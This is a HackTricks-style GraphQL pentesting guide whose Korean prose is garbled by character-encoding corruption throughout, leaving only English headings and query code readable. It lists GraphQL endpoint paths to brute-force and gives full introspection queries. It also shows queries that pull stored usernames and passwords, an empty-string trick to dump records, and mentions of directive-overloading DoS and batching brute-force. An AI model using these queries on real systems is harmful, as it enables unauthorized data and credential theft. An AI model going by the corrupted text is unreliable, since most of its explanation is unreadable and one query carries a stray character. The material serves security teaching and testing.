# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

GraphQLì€ **íš¨ìœ¨ì ì¸ ëŒ€ì•ˆ**ìœ¼ë¡œ **ê°•ì¡°**ë˜ë©°, ë°±ì—”ë“œì—ì„œ ë°ì´í„°ë¥¼ ì¿¼ë¦¬í•˜ëŠ” ê°„ì†Œí™”ëœ ì ‘ê·¼ ë°©ì‹ì„ ì œê³µí•©ë‹ˆë‹¤. RESTì™€ ë‹¬ë¦¬, RESTëŠ” ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•˜ê¸° ìœ„í•´ ë‹¤ì–‘í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì—¬ëŸ¬ ìš”ì²­ì„ í•„ìš”ë¡œ í•˜ëŠ” ê²½ìš°ê°€ ë§ì§€ë§Œ, GraphQLì€ **ë‹¨ì¼ ìš”ì²­**ì„ í†µí•´ í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê°„ì†Œí™”ëŠ” ë°ì´í„° ê°€ì ¸ì˜¤ê¸° í”„ë¡œì„¸ìŠ¤ì˜ ë³µì¡ì„±ì„ ì¤„ì—¬ **ê°œë°œìì—ê²Œ í° ì´ì **ì„ ì œê³µí•©ë‹ˆë‹¤.

## GraphQLê³¼ ë³´ì•ˆ

GraphQLì„ í¬í•¨í•œ ìƒˆë¡œìš´ ê¸°ìˆ ì˜ ì¶œí˜„ê³¼ í•¨ê»˜ ìƒˆë¡œìš´ ë³´ì•ˆ ì·¨ì•½ì ë„ ë°œìƒí•©ë‹ˆë‹¤. ì£¼ëª©í•  ì ì€ **GraphQLì€ ê¸°ë³¸ì ìœ¼ë¡œ ì¸ì¦ ë©”ì»¤ë‹ˆì¦˜ì„ í¬í•¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ëŸ¬í•œ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ êµ¬í˜„í•˜ëŠ” ê²ƒì€ ê°œë°œìì˜ ì±…ì„ì…ë‹ˆë‹¤. ì ì ˆí•œ ì¸ì¦ì´ ì—†ìœ¼ë©´ GraphQL ì—”ë“œí¬ì¸íŠ¸ê°€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìì—ê²Œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆì–´ ìƒë‹¹í•œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤.

### ë””ë ‰í† ë¦¬ ë¸Œë£¨íŠ¸ í¬ìŠ¤ ê³µê²©ê³¼ GraphQL

ë…¸ì¶œëœ GraphQL ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•´ ë””ë ‰í† ë¦¬ ë¸Œë£¨íŠ¸ í¬ìŠ¤ ê³µê²©ì— íŠ¹ì • ê²½ë¡œë¥¼ í¬í•¨í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê²½ë¡œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

ì—´ë¦° GraphQL ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹ë³„í•˜ë©´ ì§€ì›ë˜ëŠ” ì¿¼ë¦¬ë¥¼ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ì ‘ê·¼ ê°€ëŠ¥í•œ ë°ì´í„°ë¥¼ ì´í•´í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤. GraphQLì˜ introspection ì‹œìŠ¤í…œì€ ìŠ¤í‚¤ë§ˆê°€ ì§€ì›í•˜ëŠ” ì¿¼ë¦¬ë¥¼ ìì„¸íˆ ì„¤ëª…í•˜ì—¬ ì´ë¥¼ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ GraphQL ë¬¸ì„œì˜ introspectionì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### ì§€ë¬¸

ë„êµ¬ [**graphw00f**](https://github.com/dolevf/graphw00f)ëŠ” ì„œë²„ì—ì„œ ì‚¬ìš©ë˜ëŠ” GraphQL ì—”ì§„ì„ ê°ì§€í•˜ê³  ë³´ì•ˆ ê°ì‚¬ìë¥¼ ìœ„í•œ ìœ ìš©í•œ ì •ë³´ë¥¼ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ìœ ë‹ˆë²„ì„¤ ì¿¼ë¦¬ <a href="#universal-queries" id="universal-queries"></a>

URLì´ GraphQL ì„œë¹„ìŠ¤ì¸ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ **ìœ ë‹ˆë²„ì„¤ ì¿¼ë¦¬**ì¸ `query{__typename}`ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì— `{"data": {"__typename": "Query"}}`ê°€ í¬í•¨ë˜ë©´ í•´ë‹¹ URLì´ GraphQL ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ìŠ¤íŒ…í•˜ê³  ìˆìŒì„ í™•ì¸í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì¿¼ë¦¬ëœ ê°ì²´ì˜ ìœ í˜•ì„ ë‚˜íƒ€ë‚´ëŠ” GraphQLì˜ `__typename` í•„ë“œì— ì˜ì¡´í•©ë‹ˆë‹¤.
```javascript
query{__typename}
```
### ê¸°ë³¸ ì—´ê±°

Graphqlì€ ì¼ë°˜ì ìœ¼ë¡œ **GET**, **POST** (x-www-form-urlencoded) ë° **POST**(json)ë¥¼ ì§€ì›í•©ë‹ˆë‹¤. ë³´ì•ˆì„ ìœ„í•´ CSRF ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ jsonë§Œ í—ˆìš©í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

#### ì¸íŠ¸ë¡œìŠ¤í™ì…˜

ìŠ¤í‚¤ë§ˆ ì •ë³´ë¥¼ ë°œê²¬í•˜ê¸° ìœ„í•´ ì¸íŠ¸ë¡œìŠ¤í™ì…˜ì„ ì‚¬ìš©í•˜ë ¤ë©´ `__schema` í•„ë“œë¥¼ ì¿¼ë¦¬í•˜ì‹­ì‹œì˜¤. ì´ í•„ë“œëŠ” ëª¨ë“  ì¿¼ë¦¬ì˜ ë£¨íŠ¸ íƒ€ì…ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
query={__schema{types{name,fields{name}}}}
```
ì´ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ë©´ ì‚¬ìš© ì¤‘ì¸ ëª¨ë“  ìœ í˜•ì˜ ì´ë¦„ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

ì´ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ë©´ ëª¨ë“  íƒ€ì…, í•„ë“œ ë° ì¸ìˆ˜(ì¸ìˆ˜ì˜ íƒ€ì…)ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì¿¼ë¦¬í•˜ëŠ” ë°©ë²•ì„ ì•„ëŠ” ë° ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.

![](<../../.gitbook/assets/image (950).png>)

**ì˜¤ë¥˜**

**ì˜¤ë¥˜**ê°€ **í‘œì‹œ**ë ì§€ ì•„ëŠ” ê²ƒì€ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤. ì´ëŠ” ìœ ìš©í•œ **ì •ë³´**ì— ê¸°ì—¬í•  ê²ƒì…ë‹ˆë‹¤.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**ì¸íŠ¸ë¡œìŠ¤í™ì…˜ì„ í†µí•œ ë°ì´í„°ë² ì´ìŠ¤ ìŠ¤í‚¤ë§ˆ ì—´ê±°**

{% hint style="info" %}
ì¸íŠ¸ë¡œìŠ¤í™ì…˜ì´ í™œì„±í™”ë˜ì–´ ìˆì§€ë§Œ ìœ„ ì¿¼ë¦¬ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²½ìš°, ì¿¼ë¦¬ êµ¬ì¡°ì—ì„œ `onOperation`, `onFragment`, ë° `onField` ì§€ì‹œì–´ë¥¼ ì œê±°í•´ ë³´ì‹­ì‹œì˜¤.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
ì¸ë¼ì¸ ì¸ìŠ¤í™ì…˜ ì¿¼ë¦¬:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
ë§ˆì§€ë§‰ ì½”ë“œ ì¤„ì€ graphql ì¿¼ë¦¬ë¡œ, graphqlì˜ ëª¨ë“  ë©”íƒ€ ì •ë³´ë¥¼ ë¤í”„í•©ë‹ˆë‹¤ (ê°ì²´ ì´ë¦„, ë§¤ê°œë³€ìˆ˜, ìœ í˜•...)

![](<../../.gitbook/assets/image (363).png>)

ì¸íŠ¸ë¡œìŠ¤í™ì…˜ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)ë¥¼ ì‚¬ìš©í•˜ì—¬ GUIì—ì„œ ëª¨ë“  ì˜µì…˜ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¿¼ë¦¬í•˜ê¸°

ì´ì œ ë°ì´í„°ë² ì´ìŠ¤ì— ì–´ë–¤ ì¢…ë¥˜ì˜ ì •ë³´ê°€ ì €ì¥ë˜ì–´ ìˆëŠ”ì§€ ì•Œì•˜ìœ¼ë‹ˆ, **ê°’ì„ ì¶”ì¶œí•´ ë³´ê² ìŠµë‹ˆë‹¤**.

ì¸íŠ¸ë¡œìŠ¤í™ì…˜ì—ì„œ **ì§ì ‘ ì¿¼ë¦¬í•  ìˆ˜ ìˆëŠ” ê°ì²´**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê°ì²´ê°€ ì¡´ì¬í•œë‹¤ê³  í•´ì„œ ì¿¼ë¦¬í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤). ë‹¤ìŒ ì´ë¯¸ì§€ì—ì„œ "_queryType_"ì´ "_Query_"ë¼ê³  ë¶ˆë¦¬ë©°, "_Query_" ê°ì²´ì˜ í•„ë“œ ì¤‘ í•˜ë‚˜ê°€ "_flags_"ë¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë˜í•œ ê°ì²´ì˜ ìœ í˜•ì…ë‹ˆë‹¤. ë”°ë¼ì„œ í”Œë˜ê·¸ ê°ì²´ë¥¼ ì¿¼ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

ì¿¼ë¦¬ "_flags_"ì˜ ìœ í˜•ì´ "_Flags_"ë¼ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. ì´ ê°ì²´ëŠ” ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë©ë‹ˆë‹¤:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

"_Flags_" ê°ì²´ëŠ” **name**ê³¼ **value**ë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  í”Œë˜ê·¸ì˜ ì´ë¦„ê³¼ ê°’ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
query={flags{name, value}}
```
ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ **query**í•  **ê°ì²´**ê°€ **ë¬¸ìì—´**ê³¼ ê°™ì€ **ì›ì‹œ** **ìœ í˜•**ì¸ ê²½ìš°

![](<../../.gitbook/assets/image (958).png>)

ë‹¤ìŒê³¼ ê°™ì´ ì¿¼ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
query={hiddenFlags}
```
ë‹¤ë¥¸ ì˜ˆì—ì„œ "_Query_" íƒ€ì… ê°ì²´ ì•ˆì— ë‘ ê°œì˜ ê°ì²´ê°€ ìˆì—ˆìŠµë‹ˆë‹¤: "_user_"ì™€ "_users_".\
ì´ ê°ì²´ë“¤ì´ ê²€ìƒ‰ì„ ìœ„í•´ ì–´ë–¤ ì¸ìˆ˜ë„ í•„ìš”í•˜ì§€ ì•Šë‹¤ë©´, ì›í•˜ëŠ” ë°ì´í„°ë¥¼ **ìš”ì²­**í•˜ê¸°ë§Œ í•˜ë©´ **ëª¨ë“  ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ ì¸í„°ë„·ì˜ ì˜ˆì—ì„œ ì €ì¥ëœ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (880).png>)

í•˜ì§€ë§Œ ì´ ì˜ˆì—ì„œ ê·¸ë ‡ê²Œ ì‹œë„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ **ì˜¤ë¥˜**ê°€ ë°œìƒí•©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (1042).png>)

ì–´ë–»ê²Œë“  "_**uid**_" íƒ€ì… _**Int**_ì˜ ì¸ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ê²€ìƒ‰í•  ê²ƒ ê°™ìŠµë‹ˆë‹¤.\
ì–´ì¨Œë“ , ìš°ë¦¬ëŠ” ì´ë¯¸ [Basic Enumeration](graphql.md#basic-enumeration) ì„¹ì…˜ì—ì„œ í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ ë³´ì—¬ì£¼ëŠ” ì¿¼ë¦¬ê°€ ì œì•ˆë˜ì—ˆë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆì—ˆìŠµë‹ˆë‹¤: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

ì œê°€ ê·¸ ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ ì œê³µëœ ì´ë¯¸ì§€ë¥¼ ì½ì–´ë³´ë©´ "_**user**_"ê°€ íƒ€ì… _Int_ì˜ **arg** "_**uid**_"ë¥¼ ê°€ì§€ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ë˜ì„œ ì•½ê°„ì˜ _**uid**_ ë¸Œë£¨íŠ¸í¬ìŠ¤ë¥¼ ìˆ˜í–‰í•œ ê²°ê³¼, _**uid**=**1**_ì—ì„œ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ê°€ ê²€ìƒ‰ë˜ì—ˆìŠµë‹ˆë‹¤:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

ë‚˜ëŠ” **ë§¤ê°œë³€ìˆ˜** "_**user**_"ì™€ "_**password**_"ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ **ë°œê²¬**í–ˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²ƒì„ ì°¾ìœ¼ë ¤ê³  í•˜ë©´ (`query={user(uid:1){noExists}}`) ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (707).png>)

ê·¸ë¦¬ê³  **ì—´ê±° ë‹¨ê³„**ì—ì„œ "_**dbuser**_" ê°ì²´ê°€ "_**user**_"ì™€ "_**password**_" í•„ë“œë¥¼ ê°€ì§€ê³  ìˆìŒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.

**ì¿¼ë¦¬ ë¬¸ìì—´ ë¤í”„ íŠ¸ë¦­ (thanks to @BinaryShadow\_)**

ë¬¸ìì—´ íƒ€ì…ìœ¼ë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆë‹¤ë©´, ì˜ˆë¥¼ ë“¤ì–´: `query={theusers(description: ""){username,password}}`ì™€ ê°™ì´ **ë¹ˆ ë¬¸ìì—´**ì„ **ê²€ìƒ‰**í•˜ë©´ **ëª¨ë“  ë°ì´í„°ê°€ ë¤í”„ë©ë‹ˆë‹¤**. (_ì´ ì˜ˆëŠ” íŠœí† ë¦¬ì–¼ì˜ ì˜ˆì™€ ê´€ë ¨ì´ ì—†ìœ¼ë¯€ë¡œ, ì´ ì˜ˆì—ì„œëŠ” "**description**"ì´ë¼ëŠ” ë¬¸ìì—´ í•„ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ "**theusers**"ë¡œ ê²€ìƒ‰í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤_).

### ê²€ìƒ‰

ì´ ì„¤ì •ì—ì„œ, **ë°ì´í„°ë² ì´ìŠ¤**ëŠ” **ì‚¬ëŒë“¤**ê³¼ **ì˜í™”**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. **ì‚¬ëŒë“¤**ì€ ê·¸ë“¤ì˜ **ì´ë©”ì¼**ê³¼ **ì´ë¦„**ìœ¼ë¡œ ì‹ë³„ë˜ë©°; **ì˜í™”**ëŠ” ê·¸ë“¤ì˜ **ì´ë¦„**ê³¼ **í‰ì **ìœ¼ë¡œ ì‹ë³„ë©ë‹ˆë‹¤. **ì‚¬ëŒë“¤**ì€ ì„œë¡œ ì¹œêµ¬ê°€ ë  ìˆ˜ ìˆìœ¼ë©°, ë˜í•œ ì˜í™”ê°€ ìˆì–´ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ ê´€ê³„ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ì´ë¦„ìœ¼ë¡œ ì‚¬ëŒë“¤ì„ **ê²€ìƒ‰**í•˜ê³  ê·¸ë“¤ì˜ ì´ë©”ì¼ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
ë‹¹ì‹ ì€ **ì´ë¦„**ìœ¼ë¡œ ì‚¬ëŒë“¤ì„ **ê²€ìƒ‰**í•˜ê³  ê·¸ë“¤ì˜ **êµ¬ë…í•œ** **ì˜í™”**ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
`subscribedMovies`ì˜ `name`ì„ ê°€ì ¸ì˜¤ëŠ” ë°©ë²•ì— ì£¼ëª©í•˜ì„¸ìš”.

ì—¬ëŸ¬ ê°œì˜ ê°ì²´ë¥¼ **ë™ì‹œì— ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ ê²½ìš°, 2ê°œì˜ ì˜í™”ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
ë˜ëŠ” **ë³„ì¹­ì„ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ë‹¤ë¥¸ ê°ì²´ì˜ ê´€ê³„**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**MutationsëŠ” ì„œë²„ ì¸¡ì—ì„œ ë³€ê²½ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.**

**introspection**ì—ì„œ **ì„ ì–¸ëœ** **mutations**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì´ë¯¸ì§€ì—ì„œ "_MutationType_"ì€ "_Mutation_"ì´ë¼ê³  í•˜ë©°, "_Mutation_" ê°ì²´ëŠ” mutationsì˜ ì´ë¦„(ì´ ê²½ìš° "_addPerson_")ì„ í¬í•¨í•©ë‹ˆë‹¤:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

ì´ ì„¤ì •ì—ì„œ **database**ëŠ” **persons**ì™€ **movies**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. **Persons**ëŠ” **email**ê³¼ **name**ìœ¼ë¡œ ì‹ë³„ë˜ë©°, **movies**ëŠ” **name**ê³¼ **rating**ìœ¼ë¡œ ì‹ë³„ë©ë‹ˆë‹¤. **Persons**ëŠ” ì„œë¡œ ì¹œêµ¬ê°€ ë  ìˆ˜ ìˆìœ¼ë©°, ë˜í•œ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ ê´€ê³„ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì˜í™”ë¥¼ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì—ì„œ **ìƒˆë¡œìš´** ì˜í™”ë¥¼ **ìƒì„±í•˜ëŠ”** mutationì€ ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì´ ì˜ˆì œì—ì„œ mutationì€ `addMovie`ë¼ê³  í•©ë‹ˆë‹¤):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**ì¿¼ë¦¬ì—ì„œ ê°’ê³¼ ë°ì´í„° ìœ í˜•ì´ ì–´ë–»ê²Œ í‘œì‹œë˜ëŠ”ì§€ ì£¼ëª©í•˜ì‹­ì‹œì˜¤.**

ë˜í•œ ë°ì´í„°ë² ì´ìŠ¤ëŠ” `addPerson`ì´ë¼ëŠ” **ë³€í˜•** ì‘ì—…ì„ ì§€ì›í•˜ë©°, ì´ë¥¼ í†µí•´ **ì‚¬ëŒ**ì„ ìƒì„±í•˜ê³  ê¸°ì¡´ **ì¹œêµ¬** ë° **ì˜í™”**ì™€ì˜ ì—°ê´€ì„±ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¹œêµ¬ì™€ ì˜í™”ëŠ” ìƒˆë¡œ ìƒì„±ëœ ì‚¬ëŒê³¼ ì—°ê²°í•˜ê¸° ì „ì— ë°ì´í„°ë² ì´ìŠ¤ì— ë¯¸ë¦¬ ì¡´ì¬í•´ì•¼ í•œë‹¤ëŠ” ì ì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

ì´ ë³´ê³ ì„œì— ì„¤ëª…ëœ [**ì·¨ì•½ì  ì¤‘ í•˜ë‚˜**](https://www.landh.tech/blog/20240304-google-hack-50000/)ì— ì„¤ëª…ëœ ë°”ì™€ ê°™ì´, directive overloadingì€ ì„œë²„ê°€ DoS ê³µê²©ì„ ë°›ì„ ìˆ˜ ìˆì„ ë•Œê¹Œì§€ ìˆ˜ë°±ë§Œ ë²ˆì˜ directive í˜¸ì¶œì„ í†µí•´ ì„œë²„ì˜ ì‘ì—…ì„ ë‚­ë¹„í•˜ê²Œ ë§Œë“œëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

### Batching brute-force in 1 API request

ì´ ì •ë³´ëŠ” [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.\
